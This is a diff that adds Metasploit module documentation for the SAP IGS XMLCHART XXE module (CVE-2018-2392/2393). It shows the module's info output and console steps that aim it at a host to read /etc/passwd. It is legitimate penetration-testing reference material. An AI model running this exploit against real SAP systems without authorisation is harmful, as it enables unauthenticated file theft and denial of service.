@@ -64,6 +64,51 @@ msf6 > workspace -a SAP_TEST
 [*] Added workspace: SAP_TEST
 [*] Workspace: SAP_TEST
 msf6 > use auxiliary/admin/sap/sap_igs_xmlchart_xxe
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > info
+
+       Name: SAP Internet Graphics Server (IGS) XMLCHART XXE
+     Module: auxiliary/admin/sap/sap_igs_xmlchart_xxe
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2018-03-14
+
+Provided by:
+  Yvan Genuer
+  Vladimir Ivanov
+
+Available actions:
+  Name  Description
+  ----  -----------
+  DOS   Denial Of Service
+  READ  Remote file read
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  FILE     /etc/passwd      yes       File to read from the remote server
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT    40080            yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  URN      /XMLCHART        yes       Path to the SAP IGS XMLCHART page from the web root
+  VHOST                     no        HTTP server virtual host
+
+Description:
+  This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE
+  vulnerabilities within the XMLCHART page of SAP Internet Graphics
+  Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53.
+  Successful exploitation will allow unauthenticated remote attackers
+  to read files from the server as the SAP admin user, or conduct a denial
+  of service attack against the vulnerable SAP IGS server.
+
+References:
+  https://cvedetails.com/cve/CVE-2018-2392/
+  https://cvedetails.com/cve/CVE-2018-2393/
+  https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
+
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set RHOSTS 10.10.10.10
 RHOSTS => 10.10.10.10
 msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set FILE /etc/passwd
